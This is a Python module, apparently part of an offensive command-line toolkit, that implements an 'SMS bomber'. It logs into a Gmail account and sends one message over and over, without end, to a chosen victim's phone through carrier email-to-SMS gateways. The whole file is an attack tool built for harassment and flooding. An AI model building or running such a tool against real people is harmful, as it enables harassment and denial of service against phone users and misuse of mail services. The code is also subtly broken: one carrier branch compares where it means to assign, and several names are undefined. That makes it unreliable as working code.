import getpass
import smtplib

from .. import consts
from ..consts import ColorScheme as col


SMSBOMB_MENU= [
    ("target <phone>", "Set the target's phone number"),
    ("carrier <carrier>", "Set the target's phone carrier (use list carriers to show)"),
    ("email <email>", "Set disposable email WITHOUT @email identifier"),
    ("list carriers", "List available carriers"),
    ("start", "Start the attack"),
]


class SMTP(object):

    def __init__(self, command):
        self.command = command

    def smsbomb(self):
        while True:
            command = input(col.LP + "[smtp] smsbomb >> " + col.W)
            try:
                tokenized = command.split(" ")
                if tokenized[0] == "target":
                    phone = tokenized[1]
                    print("Phone => ", phone)
                    continue
                elif tokenized[0] == "carrier":
                    carrier = tokenized[1]
                    print("Carrier => ", carrier)
                    if carrier == "1":
                        attack = "@message.alltel.com"
                    elif carrier == "2":
                        attack = "@txt.att.net"
                    elif carrier == "3":
                        attack = "@myboostmobile.com"
                    elif carrier == "4":
                        attack = "@mobile.celloneusa.com"
                    elif carrier == "5":
                        attack = "@sms.edgewireless.com"
                    elif carrier == "6":
                        attack = "@mymetropcs.com"
                    elif carrier == "7":
                        attack == "@messaging.sprintpcs.com"
                    elif carrier == "8":
                        attack = "@tmomail.net"
                    elif carrier == "9":
                        attack = "@vtext.com"
                    elif carrier == "10":
                        attack = "@vmobl.com"
                    else:
                        print(LO + "[!] If cellular provider was not provided, specify gateway by manually searching it up [!]" + W)
                        print("Carrier => ", attack)
                        continue
                elif tokenized[0] == "email":
                    email = tokenized[1]
                    password = getpass.getpass(LC +"[>] What is the password? " + W )
                    try:
                        obj = smtplib.SMTP("smtp.gmail.com:587")
                        obj.starttls()
                        obj.login(email, password)
                    except smtplib.SMTPAuthenticationError:
                        print(R + "[!] Credentials not valid! Try again! [!]")
                        continue
                    print("Email => ", email)
                    continue
                elif tokenized[0] == "start":
                    print("Phone =>", phone, "\nEmail =>", email, "\nCarrier =>", carrier)
                    confirm = input(LC + "[?] Is the information valid? (y/n) " + W)
                    if (confirm == "y") or (confirm == "yes"):
                        smsbomb_exec(phone, attack, email, password)
                    continue
                elif tokenized[0] == "list":
                    print(LB + "(1) Alltel\n(2) AT&T\n(3) Boost Mobile\n(4) Cellular One\n(5) Edge Wireless\n(6) Metro PCS\n(7) Sprint")
                    print("(8) T-mobile\n(9) Verizon\n(10) Virgin Mobile" + W)
                    continue
                elif tokenized[0] == "exit":
                    break
            except ValueError:
                print(col.WARNING)
                continue
            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                break
            except UnboundLocalError:
                print(col.R + "[!] Parameters were not set before execution! [!]" + col.W)
                continue

    @staticmethod
    def smsbomb_exec(phone, attack, email, password):
        obj = smtplib.SMTP("smtp.gmail.com:587")
        obj.starttls()
        obj.login(email, password)
        message = input(col.LC + "[>] Message: " + col.W)
        target = str(phone) + str(attack)
        phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
           % (email, "".join(target), "".join(message)))
        while True:
             obj.sendmail(email, target, phone_message)
             print(col.G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + col.W)


    def execute(self):
        if self.command == "smsbomb":
            consts.print_command_help(SMSBOMB_MENU)
            self.smsbomb()
